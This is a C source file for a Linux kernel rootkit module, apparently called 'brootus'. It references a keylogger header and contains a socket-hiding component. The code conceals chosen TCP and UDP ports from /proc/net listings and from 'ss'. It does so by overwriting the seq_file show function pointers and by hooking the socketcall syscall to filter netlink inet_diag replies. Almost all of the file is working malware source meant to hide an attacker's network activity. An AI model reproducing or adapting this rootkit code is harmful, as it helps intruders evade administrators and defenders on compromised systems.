#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/unistd.h> /* Needed for indexing the sys_call_table and other constants */
#include <linux/mm_types.h>
#include <linux/types.h>  /* Needed for linux typedefs, currently not directly in use */
#include <asm/uaccess.h>  /* Needed for copy_from_user */
#include <linux/dirent.h> /* Not needed right here, but we'll stick to that */
#include <linux/sched.h>  /* Needed for task_struct and list makros */
#include <linux/proc_fs.h>  /* Needed for proc operations */
#include <linux/namei.h>  /* Needed for path lookup and nameid-structs */
#include <linux/seq_file.h> /* Needed for seq_file struct */
#include <net/tcp.h>      /* Needed for TCP_SEQ_STATE[...] */
#include <net/udp.h>      /* Needed for udp_seq_afinfo */
#include <linux/inet_diag.h> /* Needed for inet_diag_msg */

#include "kernel_functions.h"
#include "syscall.h"
#include "keylogger.h"
#include "socket_hiding.h"

#define SOCKET_STATE_VISIBLE 0
#define SOCKET_STATE_HIDDEN 1

int socket_hiding_state = SOCKET_STATE_VISIBLE;

/*
 * Saved function pointers
 */
 int (*original_tcp4_seq_show)(struct seq_file*, void*);
 int (*original_udp4_seq_show)(struct seq_file*, void*);
 asmlinkage long (*original_socketcall)(int, unsigned long*);
 int (*original_packet_rcv)(struct sk_buff*, struct net_device*,
                            struct packet_type*, struct net_device*);

 void** tcp_hook_fn_ptr;
 void** udp_hook_fn_ptr;

/*
 * TCP/UDP ports to hide
 */
 short hide_tcp_ports[MAX_HIDE_PORTS];
 short hide_udp_ports[MAX_HIDE_PORTS];
 int num_hide_tcp_ports = 0;
 int num_hide_udp_ports = 0;

 void parse_socket_port(char* str_port)
 {
  char* str_port_no = str_port + 1;
  short port_no;

    // Make sure the string is long enough
  if (strlen(str_port) < 2) {
    goto ignore;
  }

    // Extract the port number
  if (sscanf(str_port_no, "%hd", &port_no) <= 0) {
    goto ignore;
  }

    // Parse the prefix
  switch (*str_port) {
    case 't':
    case 'T':
    // printk(KERN_INFO "TCP port: %hd\n", port_no);
    hide_tcp_ports[num_hide_tcp_ports++] = port_no;
    break;
    case 'u':
    case 'U':
    // printk(KERN_INFO "UDP port: %hd\n", port_no);
    hide_udp_ports[num_hide_udp_ports++] = port_no;
    break;
    case 'a':
    case 'A':
    // printk(KERN_INFO "TCP/UDP port: %hd\n", port_no);
    hide_tcp_ports[num_hide_tcp_ports++] = port_no;
    hide_udp_ports[num_hide_udp_ports++] = port_no;
    break;
    default:
    goto ignore;
  }
  return;

  ignore:
  // printk(KERN_INFO "Ignoring parameter \"%s\"", str_port);
  return;
}

void set_socket_ports(char* ports)
{
  char* c = ports;
  char* pos = strstr(c, ",");

  // Reset the lists
  num_hide_tcp_ports = 0;
  num_hide_udp_ports = 0;

  // Split ports by commas and parse them
  while(pos != NULL) {
    *pos = '\0';
    parse_socket_port(c);

    c = pos + 1;
    pos = strstr(c, ",");
  }
  parse_socket_port(c);
}

/*
 * Helper functions to check for ports in the hide lists
 */
 inline int port_in_list(short port, short* list, int size)
 {
  int i;
  for (i = 0; i < size; i++) {
    if (list[i] == port) {
      return 1;
    }
  }
  return 0;
}

inline int hide_tcp_port(short port)
{
  // Convert port to host format
  return port_in_list(ntohs(port), hide_tcp_ports, num_hide_tcp_ports);
}

inline int hide_udp_port(short port)
{
  // Convert port to host format
  return port_in_list(ntohs(port), hide_udp_ports, num_hide_udp_ports);
}

/*
 * Hooked show function of the TCP seq file
 */
 int brootus_tcp4_seq_show(struct seq_file *seq, void *v)
 {
  struct tcp_iter_state* st;
  struct inet_sock* isk;
  struct inet_request_sock* ireq;
  struct inet_timewait_sock* itw;

  if (v == SEQ_START_TOKEN) {
    return original_tcp4_seq_show(seq, v);
  }

  st = seq->private;

  switch (st->state) {
    case TCP_SEQ_STATE_LISTENING:
    case TCP_SEQ_STATE_ESTABLISHED:
    isk = inet_sk(v);
    if (hide_tcp_port(isk->sport) || hide_tcp_port(isk->dport)) {
      return 0;
    }
    break;
    case TCP_SEQ_STATE_OPENREQ:
    ireq = inet_rsk(v);
    if (hide_tcp_port(ireq->loc_port) || hide_tcp_port(ireq->rmt_port)) {
      return 0;
    }
    case TCP_SEQ_STATE_TIME_WAIT:
    itw = inet_twsk(v);
    if (hide_tcp_port(itw->tw_sport) || hide_tcp_port(itw->tw_dport)) {
      return 0;
    }
    default:
    break;
  }
  return original_tcp4_seq_show(seq, v);
}

/*
 * Hooked show function of the UDP seq file
 */
 int brootus_udp4_seq_show(struct seq_file *seq, void *v)
 {
  struct inet_sock* isk;

  if (v == SEQ_START_TOKEN) {
    return original_udp4_seq_show(seq, v);
  }

  isk = inet_sk(v);
  if (hide_udp_port(isk->sport) || hide_udp_port(isk->dport)) {
    return 0;
  }
  return original_udp4_seq_show(seq, v);
}

/*
 * Helper function to find a subdir in procfs
 */
 struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name)
 {
  struct proc_dir_entry* result = pde->subdir;
  while(result && strcmp(name, result->name)) {
    result = result->next;
  }
  return result;
}

asmlinkage long brootus_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
{
  // Call the original function
  long ret = fn_sys_recvmsg(fd, umsg, flags);

  // Check if the file is really a socket and get it
  int err = 0;
  struct socket* s = sockfd_lookup(fd, &err);
  struct sock* sk = s->sk;

  // Check if the socket is used for the inet_diag protocol
  if (!err && sk->sk_family == AF_NETLINK && sk->sk_protocol == NETLINK_INET_DIAG) {

    // Check if it is a process called "ss" (optional ;))
    /*if (strcmp(current->comm, "ss") == 0) {*/
    long remain = ret;

      // Copy data from user space to kernel space
    struct msghdr* msg = kmalloc(ret, GFP_KERNEL);
    int err = copy_from_user(msg, umsg, ret);
    struct nlmsghdr* hdr = msg->msg_iov->iov_base;
    if (err) {
      return ret; // panic
    }

    // Iterate the entries
    do {
      struct inet_diag_msg* r = NLMSG_DATA(hdr);

      // We only have to consider TCP ports here because ss fetches
      // UDP information from /proc/udp which we already handle
      if (hide_tcp_port(r->id.idiag_sport) || hide_tcp_port(r->id.idiag_dport)) {
        // Hide the entry by coping the remaining entries over it
        long new_remain = remain;
        struct nlmsghdr* next_entry = NLMSG_NEXT(hdr, new_remain);
        memmove(hdr, next_entry, new_remain);

        // Adjust the length variables
        ret -= (remain - new_remain);
        remain = new_remain;
      } else {
        // Nothing to do -> skip this entry
        hdr = NLMSG_NEXT(hdr, remain);
      }
    } while (remain > 0);

    // Copy data back to user space
    err = copy_to_user(umsg, msg, ret);
    kfree(msg);
    if (err) {
      return ret; // panic
    }
  /*}*/
  }
  return ret;
}

asmlinkage long brootus_socketcall(int call, unsigned long __user *args)
{
  switch (call) {
    case SYS_RECVMSG:
      return brootus_recvmsg(args[0], (struct msghdr __user *)args[1], args[2]);
    default:
      return original_socketcall(call, args);
  }
}

void enable_socket_hiding(void)
{
  struct net* net_ns;

  if (socket_hiding_state == SOCKET_STATE_HIDDEN) {
    return;
  }

    // Iterate all net namespaces
  list_for_each_entry(net_ns, &net_namespace_list, list) {

    // Get the corresponding proc entries
    struct proc_dir_entry* pde_net = net_ns->proc_net;
    struct proc_dir_entry* pde_tcp = get_pde_subdir(pde_net, "tcp");
    struct proc_dir_entry* pde_udp = get_pde_subdir(pde_net, "udp");
    struct tcp_seq_afinfo* tcp_info = pde_tcp->data;
    struct udp_seq_afinfo* udp_info = pde_udp->data;

    // Save and hook the TCP show function
    tcp_hook_fn_ptr = (void**) &tcp_info->seq_ops.show;
    original_tcp4_seq_show = *tcp_hook_fn_ptr;
    *tcp_hook_fn_ptr = brootus_tcp4_seq_show;

    // Save and hook the UDP show function
    udp_hook_fn_ptr = (void**) &udp_info->seq_ops.show;
    original_udp4_seq_show = *udp_hook_fn_ptr;
    *udp_hook_fn_ptr = brootus_udp4_seq_show;
  }

  syscall_table_modify_begin();
  HOOK_SYSCALL(socketcall);
  syscall_table_modify_end();

  socket_hiding_state = SOCKET_STATE_HIDDEN;
}

void disable_socket_hiding(void)
{
  if (socket_hiding_state == SOCKET_STATE_VISIBLE) {
    return;
  }
    // Restore the hooked funtions
  *tcp_hook_fn_ptr = original_tcp4_seq_show;
  *udp_hook_fn_ptr = original_udp4_seq_show;

  syscall_table_modify_begin();
  RESTORE_SYSCALL(socketcall);
  syscall_table_modify_end();

  socket_hiding_state = SOCKET_STATE_VISIBLE;
}


void init_socket_hiding(void)
{
  enable_socket_hiding();
}

void finalize_socket_hiding(void)
{
  disable_socket_hiding();
}
